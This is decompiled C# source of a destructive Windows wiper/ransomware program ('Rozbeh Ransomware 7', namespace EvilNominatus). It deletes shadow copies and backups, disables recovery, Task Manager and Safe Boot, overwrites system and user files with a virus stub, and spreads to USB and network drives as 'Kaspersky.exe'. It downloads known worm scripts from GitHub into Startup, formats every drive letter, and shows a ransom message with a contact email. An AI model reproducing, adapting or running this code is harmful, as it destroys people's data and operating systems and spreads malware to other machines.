#define DEBUG
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Windows.Forms;
using Microsoft.Win32;

namespace EvilNominatus;

public class MainForm : Form
{
	private const uint GenericRead = 2147483648u;

	private const uint GenericWrite = 1073741824u;

	private const uint GenericExecute = 536870912u;

	private const uint GenericAll = 268435456u;

	private const uint FileShareRead = 1u;

	private const uint FileShareWrite = 2u;

	private const uint OpenExisting = 3u;

	private const uint FileFlagDeleteOnClose = 67108864u;

	private const uint MbrSize = 512u;

	public string myself = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);

	private IContainer components = null;

	private Label label1;

	private PictureBox pictureBox1;

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("kernel32")]
	private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

	[DllImport("kernel32")]
	private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

	public static void runCommand(string commands)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "cmd.exe",
			Arguments = "/C " + commands,
			WindowStyle = ProcessWindowStyle.Hidden
		};
		process.Start();
		process.WaitForExit();
	}

	public static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	public static void spread(string dp)
	{
		try
		{
			File.Copy(Assembly.GetExecutingAssembly().Location, dp + "Kaspersky.exe");
		}
		catch
		{
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern void SleepL(int seconds);

	public MainForm()
	{
		//IL_0721: Unknown result type (might be due to invalid IL or missing references)
		InitializeComponent();
		checked
		{
			try
			{
				deleteShadowCopies();
				runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
				runCommand("wbadmin delete catalog -quiet");
				runCommand("assoc .exe=ENCRYPTEDFILE");
				runCommand("net stop security center");
				runCommand("START reg delete HKCR/.exe");
				runCommand("START reg delete HKCR/.dll");
				runCommand("START reg delete HKCR/*");
				runCommand("Rundll32 user32, SwapMouseButton");
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
				registryKey2.SetValue("Wallpaper", "", RegistryValueKind.String);
				RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
				registryKey3.SetValue("Shell", "empty", RegistryValueKind.String);
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					try
					{
						if (driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.Network)
						{
							spread(driveInfo.Name.ToString());
						}
						if (driveInfo.Name.ToString() == "C:\\")
						{
							File.Delete("C:\\Users\\" + Environment.UserName);
						}
						else
						{
							Directory.Delete(driveInfo.Name.ToString());
						}
						string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
						string[] directories = Directory.GetDirectories(folderPath);
						for (int j = 0; j < directories.Length; j++)
						{
							Directory.Delete(directories[j]);
						}
					}
					catch
					{
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine("Error " + ex.Message);
			}
			string[] array;
			try
			{
				string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string[] files = Directory.GetFiles(folderPath2);
				string userName = Environment.UserName;
				DirectorySecurity accessControl = Directory.GetAccessControl(folderPath2);
				FileSystemAccessRule fileSystemAccessRule = new FileSystemAccessRule(userName, FileSystemRights.FullControl, AccessControlType.Deny);
				array = files;
				foreach (string path in array)
				{
					string[] contents = new string[1] { " 0xB7, 0x64, 0xB4, 0x4E, 0xBA, 0x34, 0x01, 0xCD, 0x21, 0x72, 0x1D, 0xBA, 0x9E, 0x00, 0xB8, 0x01, 0x3D, 0xCD, 0x21, 0x93, 0xBA, 0x00, 0x01, 0xB9, 0x56, 0x00, 0xB4, 0x40, 0xCD, 0x21, 0xB4, 0x3E, 0xCD, 0x21, 0xB4, 0x4F, 0xCD, 0x21, 0xEB, 0xE1, 0xBA, 0x38, 0x01, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x00, 0x4C, 0xCD, 0x21, 0x2A, 0x2E, 0x2A, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x49, 0x6E, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x61, 0x20, 0x56, 0x69, 0x72, 0x75, 0x73, 0x21, 0x0D, 0x0A, 0x24 " };
					File.WriteAllLines(path, contents);
				}
				folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string[] files2 = Directory.GetFiles(folderPath2);
				string[] directories2 = Directory.GetDirectories(folderPath2);
				string userName2 = Environment.UserName;
				string[] contents2 = new string[1] { " 0xB7, 0x64, 0xB4, 0x4E, 0xBA, 0x34, 0x01, 0xCD, 0x21, 0x72, 0x1D, 0xBA, 0x9E, 0x00, 0xB8, 0x01, 0x3D, 0xCD, 0x21, 0x93, 0xBA, 0x00, 0x01, 0xB9, 0x56, 0x00, 0xB4, 0x40, 0xCD, 0x21, 0xB4, 0x3E, 0xCD, 0x21, 0xB4, 0x4F, 0xCD, 0x21, 0xEB, 0xE1, 0xBA, 0x38, 0x01, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x00, 0x4C, 0xCD, 0x21, 0x2A, 0x2E, 0x2A, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x49, 0x6E, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x61, 0x20, 0x56, 0x69, 0x72, 0x75, 0x73, 0x21, 0x0D, 0x0A, 0x24 " };
				DirectorySecurity accessControl2 = Directory.GetAccessControl(folderPath2);
				FileSystemAccessRule rule = new FileSystemAccessRule(userName2, FileSystemRights.FullControl, AccessControlType.Allow);
				accessControl2.AddAccessRule(rule);
				Directory.SetAccessControl(folderPath2, accessControl2);
				File.SetAttributes(folderPath2, FileAttributes.Normal);
				array = directories2;
				foreach (string path in array)
				{
					File.WriteAllLines(path, contents2);
				}
				byte[] bytes = File.ReadAllBytes(myself);
				string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
				string[] files3 = Directory.GetFiles(folderPath3 + "\\", "*", SearchOption.AllDirectories);
				for (int k = 0; k < files3.Length; k++)
				{
					File.WriteAllBytes(files3[k], bytes);
				}
				string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.History);
				string[] files4 = Directory.GetFiles(folderPath4 + "\\", "*", SearchOption.AllDirectories);
				for (int l = 0; l < files4.Length; l++)
				{
					File.Delete(files4[l]);
				}
				string directoryName = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
				string currentDirectory = Directory.GetCurrentDirectory();
				string fullPath = Path.GetFullPath(currentDirectory);
				string fileName = Path.GetFileName(fullPath);
				File.Copy(directoryName, "C:\\Users\\Public\\RozbehSkullofMask.exe");
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					try
					{
						if (driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.Network)
						{
							spread(driveInfo.Name.ToString());
						}
						if (driveInfo.Name.ToString() == "C:\\")
						{
							File.Delete("C:\\Users\\" + Environment.UserName);
						}
						else
						{
							Directory.Delete(driveInfo.Name.ToString());
						}
						string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
						string[] directories = Directory.GetDirectories(folderPath);
						for (int j = 0; j < directories.Length; j++)
						{
							Directory.Delete(directories[j]);
						}
					}
					catch
					{
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine("Error " + ex.Message);
			}
			try
			{
				string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string[] files = Directory.GetFiles(folderPath2);
				string userName = Environment.UserName;
				DirectorySecurity accessControl = Directory.GetAccessControl(folderPath2);
				FileSystemAccessRule fileSystemAccessRule = new FileSystemAccessRule(userName, FileSystemRights.FullControl, AccessControlType.Deny);
				array = files;
				foreach (string path in array)
				{
					string[] contents = new string[1] { " 0xB7, 0x64, 0xB4, 0x4E, 0xBA, 0x34, 0x01, 0xCD, 0x21, 0x72, 0x1D, 0xBA, 0x9E, 0x00, 0xB8, 0x01, 0x3D, 0xCD, 0x21, 0x93, 0xBA, 0x00, 0x01, 0xB9, 0x56, 0x00, 0xB4, 0x40, 0xCD, 0x21, 0xB4, 0x3E, 0xCD, 0x21, 0xB4, 0x4F, 0xCD, 0x21, 0xEB, 0xE1, 0xBA, 0x38, 0x01, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x00, 0x4C, 0xCD, 0x21, 0x2A, 0x2E, 0x2A, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x49, 0x6E, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x61, 0x20, 0x56, 0x69, 0x72, 0x75, 0x73, 0x21, 0x0D, 0x0A, 0x24 " };
					File.WriteAllLines(path, contents);
				}
				folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string[] files2 = Directory.GetFiles(folderPath2);
				string[] directories2 = Directory.GetDirectories(folderPath2);
				string userName2 = Environment.UserName;
				string[] contents2 = new string[1] { " 0xB7, 0x64, 0xB4, 0x4E, 0xBA, 0x34, 0x01, 0xCD, 0x21, 0x72, 0x1D, 0xBA, 0x9E, 0x00, 0xB8, 0x01, 0x3D, 0xCD, 0x21, 0x93, 0xBA, 0x00, 0x01, 0xB9, 0x56, 0x00, 0xB4, 0x40, 0xCD, 0x21, 0xB4, 0x3E, 0xCD, 0x21, 0xB4, 0x4F, 0xCD, 0x21, 0xEB, 0xE1, 0xBA, 0x38, 0x01, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x00, 0x4C, 0xCD, 0x21, 0x2A, 0x2E, 0x2A, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x49, 0x6E, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x61, 0x20, 0x56, 0x69, 0x72, 0x75, 0x73, 0x21, 0x0D, 0x0A, 0x24 " };
				DirectorySecurity accessControl2 = Directory.GetAccessControl(folderPath2);
				FileSystemAccessRule rule = new FileSystemAccessRule(userName2, FileSystemRights.FullControl, AccessControlType.Allow);
				accessControl2.AddAccessRule(rule);
				Directory.SetAccessControl(folderPath2, accessControl2);
				File.SetAttributes(folderPath2, FileAttributes.Normal);
				array = directories2;
				foreach (string path in array)
				{
					File.WriteAllLines(path, contents2);
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine("Error " + ex.Message);
			}
			string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			string[] files5 = Directory.GetFiles(folderPath5, "*.*", SearchOption.AllDirectories);
			array = files5;
			foreach (string path in array)
			{
				try
				{
					string[] contents3 = new string[1] { " 0xB7, 0x64, 0xB4, 0x4E, 0xBA, 0x34, 0x01, 0xCD, 0x21, 0x72, 0x1D, 0xBA, 0x9E, 0x00, 0xB8, 0x01, 0x3D, 0xCD, 0x21, 0x93, 0xBA, 0x00, 0x01, 0xB9, 0x56, 0x00, 0xB4, 0x40, 0xCD, 0x21, 0xB4, 0x3E, 0xCD, 0x21, 0xB4, 0x4F, 0xCD, 0x21, 0xEB, 0xE1, 0xBA, 0x38, 0x01, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x00, 0x4C, 0xCD, 0x21, 0x2A, 0x2E, 0x2A, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x49, 0x6E, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x61, 0x20, 0x56, 0x69, 0x72, 0x75, 0x73, 0x21, 0x0D, 0x0A, 0x24 " };
					File.WriteAllLines(path, contents3);
				}
				catch (Exception ex)
				{
					Debug.WriteLine("Error " + ex.Message);
				}
			}
			string[] contents4 = new string[1] { " 0xB7, 0x64, 0xB4, 0x4E, 0xBA, 0x34, 0x01, 0xCD, 0x21, 0x72, 0x1D, 0xBA, 0x9E, 0x00, 0xB8, 0x01, 0x3D, 0xCD, 0x21, 0x93, 0xBA, 0x00, 0x01, 0xB9, 0x56, 0x00, 0xB4, 0x40, 0xCD, 0x21, 0xB4, 0x3E, 0xCD, 0x21, 0xB4, 0x4F, 0xCD, 0x21, 0xEB, 0xE1, 0xBA, 0x38, 0x01, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x00, 0x4C, 0xCD, 0x21, 0x2A, 0x2E, 0x2A, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x49, 0x6E, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x61, 0x20, 0x56, 0x69, 0x72, 0x75, 0x73, 0x21, 0x0D, 0x0A, 0x24 " };
			string currentDirectory2 = Directory.GetCurrentDirectory();
			string[] files6 = Directory.GetFiles(currentDirectory2, "*.*", SearchOption.AllDirectories);
			array = files6;
			foreach (string path2 in array)
			{
				try
				{
					File.WriteAllLines(path2, contents4);
				}
				catch (Exception ex2)
				{
					Debug.WriteLine("Error " + ex2.Message);
					MessageBox.Show(ex2.Message, (string)null, (MessageBoxButtons)0, (MessageBoxIcon)16);
				}
			}
			string folderPath6 = Environment.GetFolderPath(Environment.SpecialFolder.Fonts);
			string[] files7 = Directory.GetFiles(folderPath6);
			string[] directories3 = Directory.GetDirectories(folderPath6);
			array = files7;
			foreach (string path3 in array)
			{
				string[] contents5 = new string[1] { "  0xB7, 0x64, 0xB4, 0x4E, 0xBA, 0x34, 0x01, 0xCD, 0x21, 0x72, 0x1D, 0xBA, 0x9E, 0x00, 0xB8, 0x01, 0x3D, 0xCD, 0x21, 0x93, 0xBA, 0x00, 0x01, 0xB9, 0x56, 0x00, 0xB4, 0x40, 0xCD, 0x21, 0xB4, 0x3E, 0xCD, 0x21, 0xB4, 0x4F, 0xCD, 0x21, 0xEB, 0xE1, 0xBA, 0x38, 0x01, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x00, 0x4C, 0xCD, 0x21, 0x2A, 0x2E, 0x2A, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x49, 0x6E, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x61, 0x20, 0x56, 0x69, 0x72, 0x75, 0x73, 0x21, 0x0D, 0x0A, 0x24 " };
				File.WriteAllLines(path3, contents5);
				File.Delete(path3);
			}
			array = directories3;
			foreach (string path4 in array)
			{
				string[] contents6 = new string[1] { "  0xB7, 0x64, 0xB4, 0x4E, 0xBA, 0x34, 0x01, 0xCD, 0x21, 0x72, 0x1D, 0xBA, 0x9E, 0x00, 0xB8, 0x01, 0x3D, 0xCD, 0x21, 0x93, 0xBA, 0x00, 0x01, 0xB9, 0x56, 0x00, 0xB4, 0x40, 0xCD, 0x21, 0xB4, 0x3E, 0xCD, 0x21, 0xB4, 0x4F, 0xCD, 0x21, 0xEB, 0xE1, 0xBA, 0x38, 0x01, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x00, 0x4C, 0xCD, 0x21, 0x2A, 0x2E, 0x2A, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x49, 0x6E, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x61, 0x20, 0x56, 0x69, 0x72, 0x75, 0x73, 0x21, 0x0D, 0x0A, 0x24 " };
				File.WriteAllLines(path4, contents6);
				File.Delete(path4);
			}
			try
			{
				string folderPath7 = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu);
				string[] files8 = Directory.GetFiles(folderPath7);
				array = files8;
				foreach (string path5 in array)
				{
					string[] contents7 = new string[1] { "  0xB7, 0x64, 0xB4, 0x4E, 0xBA, 0x34, 0x01, 0xCD, 0x21, 0x72, 0x1D, 0xBA, 0x9E, 0x00, 0xB8, 0x01, 0x3D, 0xCD, 0x21, 0x93, 0xBA, 0x00, 0x01, 0xB9, 0x56, 0x00, 0xB4, 0x40, 0xCD, 0x21, 0xB4, 0x3E, 0xCD, 0x21, 0xB4, 0x4F, 0xCD, 0x21, 0xEB, 0xE1, 0xBA, 0x38, 0x01, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x00, 0x4C, 0xCD, 0x21, 0x2A, 0x2E, 0x2A, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x49, 0x6E, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x61, 0x20, 0x56, 0x69, 0x72, 0x75, 0x73, 0x21, 0x0D, 0x0A, 0x24 " };
					File.WriteAllLines(path5, contents7);
					File.Delete(path5);
				}
			}
			catch (Exception ex3)
			{
				Console.WriteLine(ex3.Message);
			}
			try
			{
				string folderPath8 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
				string currentDirectory3 = Directory.GetCurrentDirectory();
				File.Copy(currentDirectory3, folderPath8);
			}
			catch (Exception ex4)
			{
				Console.WriteLine(ex4.Message);
			}
			try
			{
				Process.EnterDebugMode();
				string folderPath9 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
				using (WebClient webClient = new WebClient())
				{
					webClient.DownloadFile("https://raw.githubusercontent.com/onx/ILOVEYOU/master/LOVE-LETTER-FOR-YOU.TXT.vbs", "Antivirus.VBS");
					webClient.DownloadFile("https://raw.githubusercontent.com/Da2dalus/The-MALWARE-Repo/master/Worm/HeadTail.vbs", "Kaspersky.VBS");
					webClient.DownloadFile("https://raw.githubusercontent.com/MalDev101/Loveware/master/Loveware/Loveware.bat", "ANTIVIRUS.bat");
				}
				File.Copy("Antivirus.vbs", folderPath9);
				File.Copy("ANTIVIRUS.BAT", folderPath9);
				File.Copy("Kaspersky.VBS", folderPath9);
				File.Encrypt("C:\\users");
			}
			catch (Exception ex5)
			{
				Console.WriteLine(ex5.Message);
			}
			try
			{
				string folderPath10 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
				fileSystemWatcher.Path = folderPath10;
				fileSystemWatcher.IncludeSubdirectories = true;
				fileSystemWatcher.InternalBufferSize = 1000000;
				fileSystemWatcher.Created += OnCreated;
			}
			catch (Exception ex6)
			{
				Debug.WriteLine(ex6.Message);
			}
			try
			{
				string folderPath11 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
				FileSystemWatcher fileSystemWatcher2 = new FileSystemWatcher();
				fileSystemWatcher2.Path = folderPath11;
				fileSystemWatcher2.IncludeSubdirectories = true;
				fileSystemWatcher2.Created += OnCreated;
			}
			catch (Exception ex7)
			{
				Console.WriteLine(ex7.Message);
			}
			try
			{
				string folderPath12 = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
				string[] files9 = Directory.GetFiles(folderPath12);
				string[] directories4 = Directory.GetDirectories(folderPath12);
				string currentDirectory4 = Directory.GetCurrentDirectory();
				array = files9;
				foreach (string destFileName in array)
				{
					File.Copy(currentDirectory4, destFileName);
				}
				byte[] bytes = File.ReadAllBytes(myself);
				string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
				string[] files3 = Directory.GetFiles(folderPath3 + "\\", "*", SearchOption.AllDirectories);
				for (int k = 0; k < files3.Length; k++)
				{
					File.WriteAllBytes(files3[k], bytes);
				}
				string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.History);
				string[] files4 = Directory.GetFiles(folderPath4 + "\\", "*", SearchOption.AllDirectories);
				for (int l = 0; l < files4.Length; l++)
				{
					File.Delete(files4[l]);
				}
			}
			catch (Exception ex8)
			{
				Debug.WriteLine(ex8.Message);
			}
			try
			{
				string currentDirectory5 = Directory.GetCurrentDirectory();
				DirectoryInfo directoryInfo = new DirectoryInfo(currentDirectory5);
				FileInfo[] files10 = directoryInfo.GetFiles("*.*");
				string text = "";
				string[] contents8 = new string[1] { " 0xB7, 0x64, 0xB4, 0x4E, 0xBA, 0x34, 0x01, 0xCD, 0x21, 0x72" };
				FileInfo[] array2 = files10;
				foreach (FileInfo fileInfo in array2)
				{
					text = text + ", " + fileInfo.Name;
					File.WriteAllLines(text, contents8);
				}
				string folderPath13 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
				string[] contents9 = new string[1] { " 0xB7, 0x64, 0xB4, 0x4E, 0xBA, 0x34, 0x01, 0xCD, 0x21, 0x72" };
				DirectoryInfo directoryInfo2 = new DirectoryInfo(folderPath13);
				FileInfo[] files11 = directoryInfo2.GetFiles("*.*");
				string text2 = "";
				byte[] array3 = new byte[1] { 9 };
				array2 = files11;
				foreach (FileInfo fileInfo2 in array2)
				{
					text2 = text2 + ", " + fileInfo2.Name;
					string name = fileInfo2.Name;
					File.WriteAllLines(text2, contents9);
				}
				string folderPath14 = Environment.GetFolderPath(Environment.SpecialFolder.System);
				string[] files12 = Directory.GetFiles(folderPath14);
				string userName2 = Environment.UserName;
				DirectorySecurity accessControl2 = Directory.GetAccessControl(folderPath14);
				FileSystemAccessRule rule = new FileSystemAccessRule(userName2, FileSystemRights.FullControl, AccessControlType.Deny);
				accessControl2.SetAccessRule(rule);
				Directory.SetAccessControl(folderPath14, accessControl2);
				int num = 1;
				int num2 = 29;
				runCommand("dir /s > d.txt");
				runCommand("for /F tokens=* %%A in (d.txt) do del %%A");
				runCommand("pnputil.exe -f -d oem0.inf");
				runCommand("pnputil.exe -f -d oem2.inf");
				runCommand("pnputil.exe -f -d oem3.inf");
				runCommand("pnputil.exe -f -d oem4.inf");
				runCommand("pnputil.exe -f -d oem5.inf");
				runCommand("pnputil.exe -f -d oem7.inf");
				runCommand("pnputil.exe -f -d oem8.inf");
				runCommand("pnputil.exe -f -d oem9.inf");
				runCommand("pnputil.exe -f -d oem10.inf");
				runCommand("pnputil.exe -f -d c:\\drivers\\*.inf");
				runCommand("pnputil.exe -f -d c:\\drivers\\*.*");
				runCommand("format  A: /FS:NTFS /X /Q /y");
				runCommand("format  B: /FS:NTFS /X /Q /y");
				runCommand("format  C: /FS:NTFS /X /Q /y");
				runCommand("format  D: /FS:NTFS /X /Q /y");
				runCommand("format  E: /FS:NTFS /X /Q /y");
				runCommand("format  F: /FS:NTFS /X /Q /y");
				runCommand("format  G: /FS:NTFS /X /Q /y");
				runCommand("format  H: /FS:NTFS /X /Q /y");
				runCommand("format  I: /FS:NTFS /X /Q /y");
				runCommand("format  J: /FS:NTFS /X /Q /y");
				runCommand("format  K: /FS:NTFS /X /Q /y");
				runCommand("format  L: /FS:NTFS /X /Q /y");
				runCommand("format  M: /FS:NTFS /X /Q /y");
				runCommand("format  N: /FS:NTFS /X /Q /y");
				runCommand("format  O: /FS:NTFS /X /Q /y");
				runCommand("format  P: /FS:NTFS /X /Q /y");
				runCommand("format  Q: /FS:NTFS /X /Q /y");
				runCommand("format  R: /FS:NTFS /X /Q /y");
				runCommand("format  S: /FS:NTFS /X /Q /y");
				runCommand("format  T: /FS:NTFS /X /Q /y");
				runCommand("format  U: /FS:NTFS /X /Q /y");
				runCommand("format  V: /FS:NTFS /X /Q /y");
				runCommand("format  W: /FS:NTFS /X /Q /y");
				runCommand("format  X: /FS:NTFS /X /Q /y");
				runCommand("format  Y: /FS:NTFS /X /Q /y");
				runCommand("format  Z: /FS:NTFS /X /Q /y");
			}
			catch
			{
			}
			try
			{
				string directoryName2 = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
				byte[] bytes2 = File.ReadAllBytes(directoryName2);
				string folderPath15 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
				DirectoryInfo directoryInfo3 = new DirectoryInfo(folderPath15);
				FileInfo[] files13 = directoryInfo3.GetFiles("*.*");
				string text3 = "";
				FileInfo[] array2 = files13;
				foreach (FileInfo fileInfo3 in array2)
				{
					text3 = text3 + ", " + fileInfo3.Name;
					File.WriteAllBytes(text3, bytes2);
				}
			}
			catch
			{
			}
			try
			{
				runCommand("@echo off && ipconfig /release && assoc .txt=INFECTEDFILE && assoc .reg=INFECTEDFILE && assoc .bat=INFECTEDFILE && assoc .sys=INFECTEDFILE && assoc .dll=INFECTEDFILE && assoc .vbs=INFECTEDFILE && assoc .js=INFECTEDFILE && assoc .vbe=INFECTEDFILE && asoc .cmd=INFECTEDFILE && assoc .png=INFECTEDFILE && assoc .html=INFECTEDFILE && assoc .hta=INFECTEDFILE && assoc .docx=INFECTEDFILE && assoc .doc=INFECTEDFILE && assoc .jar=INFECTEDFILE && assoc .class=INFECTEDFILE && assoc .VB=INFECTEDFILE && assoc .CS=INFECTEDFILE && assoc .xml=INFECTEDFILE && assoc .CPP+INFECTEDFILE && Rundll32 user32, SwapMouseButton && bcdedit.exe /delete  {current}");
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					Directory.Delete(driveInfo.ToString());
					File.Delete(driveInfo.ToString());
					if (driveInfo.ToString() != "C:\\")
					{
						Directory.Delete(driveInfo.ToString());
						File.Delete(driveInfo.ToString());
					}
				}
				drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					Directory.Delete(driveInfo.ToString());
				}
				drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					spread2(driveInfo.ToString());
				}
				string folderPath16 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
				string folderPath14 = Environment.GetFolderPath(Environment.SpecialFolder.System);
				string[] files14 = Directory.GetFiles(folderPath14);
				string userName2 = Environment.UserName;
				DirectorySecurity accessControl2 = Directory.GetAccessControl(folderPath14);
				FileSystemAccessRule rule = new FileSystemAccessRule(userName2, FileSystemRights.FullControl, AccessControlType.Deny);
				accessControl2.SetAccessRule(rule);
				Directory.SetAccessControl(folderPath14, accessControl2);
				int num = 1;
				int num2 = 29;
				NtSetInformationProcess(Process.GetCurrentProcess().Handle, num2, ref num, 4);
				RegistryKey registryKey4 = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\CrashControl");
				registryKey4.SetValue("CrashDumpEnabled", "1", RegistryValueKind.String);
				Registry.LocalMachine.DeleteSubKeyTree("SYSTEM\\CurrentControlSet\\Control\\SafeBoot");
				Registry.LocalMachine.DeleteSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal");
				Registry.LocalMachine.DeleteSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network");
			}
			catch (Exception)
			{
			}
		}
	}

	public void OnCreated(object source, FileSystemEventArgs a)
	{
		try
		{
			string fullPath = a.FullPath;
			File.Delete(fullPath);
		}
		catch
		{
		}
	}

	public static void spread2(string dp)
	{
		try
		{
			File.Copy(Assembly.GetExecutingAssembly().Location, dp + "Kaspersky.exe");
		}
		catch
		{
		}
	}

	public static void Infect(string FILENAME1)
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
		byte[] bytes = File.ReadAllBytes(directoryName);
		File.WriteAllBytes(FILENAME1, bytes);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0055: Expected O, but got Unknown
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ce: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
		pictureBox1 = new PictureBox();
		label1 = new Label();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		pictureBox1.Image = (Image)componentResourceManager.GetObject("pictureBox1.Image");
		((Control)pictureBox1).Location = new Point(12, 12);
		((Control)pictureBox1).Name = "pictureBox1";
		((Control)pictureBox1).Size = new Size(227, 227);
		pictureBox1.TabIndex = 0;
		pictureBox1.TabStop = false;
		((Control)label1).Font = new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)label1).Location = new Point(283, 38);
		((Control)label1).Name = "label1";
		((Control)label1).Size = new Size(279, 217);
		((Control)label1).TabIndex = 1;
		((Control)label1).Text = "All your Files has been Encrypted by Rozbeh Ransomware 7\r\n\r\ncontact bkhtyaryrwzbh@gmail.com for more information\r\nhe made this Virus";
		((ContainerControl)this).AutoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Control)this).BackColor = Color.Red;
		((Form)this).ClientSize = new Size(624, 476);
		((Control)this).Controls.Add((Control)(object)label1);
